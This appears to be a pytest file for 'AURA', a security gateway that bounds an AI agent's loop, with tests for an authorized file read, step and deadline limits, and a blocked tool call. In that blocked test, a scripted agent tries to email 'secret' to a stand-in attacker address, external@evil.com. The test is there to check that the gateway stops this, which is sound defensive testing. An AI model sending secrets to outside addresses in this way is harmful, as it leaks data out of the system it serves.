"""Unit tests for AURA Bounded Agent Loop."""

from __future__ import annotations

import pytest

from aura.agent import (
    AgentLoop,
    LLMResponse,
    ScriptedLLMClient,
    ToolCallProposal,
)
from aura.gateway import AuraGateway
from aura.models import AgentIdentity, Decision, ToolAction
from tests.conftest import FIXTURES_DIR


@pytest.fixture
def gateway():
    return AuraGateway.create_default(config_dir=str(FIXTURES_DIR))


class TestAgentLoop:
    def test_successful_tool_and_completion(self, gateway, reader_agent):
        """Agent proposes authorized read_file, gets result, and produces final answer."""
        steps = [
            LLMResponse(
                tool_calls=[
                    ToolCallProposal(
                        tool_name="read_file",
                        arguments={"doc_id": "public/readme"},
                    )
                ]
            ),
            LLMResponse(
                content="I have read the public readme document. It describes the AURA project."
            ),
        ]
        client = ScriptedLLMClient(steps)
        loop = AgentLoop(gateway=gateway, llm_client=client, max_steps=8)

        result = loop.run(goal="Read the public readme", agent=reader_agent)

        assert result.completed is True
        assert result.steps_taken == 2
        assert result.total_tool_calls == 1
        assert result.blocked_tool_calls == 0
        assert "AURA project" in (result.final_answer or "")
        assert gateway.tool_registry.get(ToolAction.READ_FILE).call_count >= 1

    def test_blocked_tool_gives_explicit_feedback(self, gateway, reader_agent):
        """Agent proposes unauthorized send_email; receives explicit block feedback."""
        send_email_adapter = gateway.tool_registry.get(ToolAction.SEND_EMAIL)
        send_email_adapter.reset_counter()

        steps = [
            LLMResponse(
                tool_calls=[
                    ToolCallProposal(
                        tool_name="send_email",
                        arguments={"to": "external@evil.com", "body": "secret"},
                    )
                ]
            ),
            LLMResponse(
                content="I attempted to send an email, but the security gateway blocked the action."
            ),
        ]
        client = ScriptedLLMClient(steps)
        loop = AgentLoop(gateway=gateway, llm_client=client, max_steps=8)

        result = loop.run(goal="Send secret email", agent=reader_agent)

        assert result.completed is True
        assert result.total_tool_calls == 1
        assert result.blocked_tool_calls == 1
        # Invariant: tool adapter counter is ZERO!
        assert send_email_adapter.call_count == 0

    def test_loop_stops_at_max_steps(self, gateway, reader_agent):
        """Agent loop stops when max_steps (8) is reached."""
        # Provide infinite sequence of tool calls
        infinite_steps = [
            LLMResponse(
                tool_calls=[
                    ToolCallProposal(
                        tool_name="read_file",
                        arguments={"doc_id": "public/readme"},
                    )
                ]
            )
            for _ in range(12)
        ]
        client = ScriptedLLMClient(infinite_steps)
        loop = AgentLoop(gateway=gateway, llm_client=client, max_steps=8)

        result = loop.run(goal="Loop forever", agent=reader_agent)

        assert result.completed is False
        assert result.steps_taken == 8
        assert result.error == "MAX_STEPS_EXCEEDED"

    def test_loop_stops_on_deadline_timeout(self, gateway, reader_agent):
        """Agent loop halts if global deadline is expired."""
        steps = [
            LLMResponse(
                tool_calls=[
                    ToolCallProposal(
                        tool_name="read_file",
                        arguments={"doc_id": "public/readme"},
                    )
                ]
            )
        ]
        client = ScriptedLLMClient(steps)
        # 0.0001 second duration
        loop = AgentLoop(gateway=gateway, llm_client=client, max_duration_seconds=-1.0)

        result = loop.run(goal="Timeout test", agent=reader_agent)

        assert result.completed is False
        assert result.error == "GLOBAL_DEADLINE_EXCEEDED"

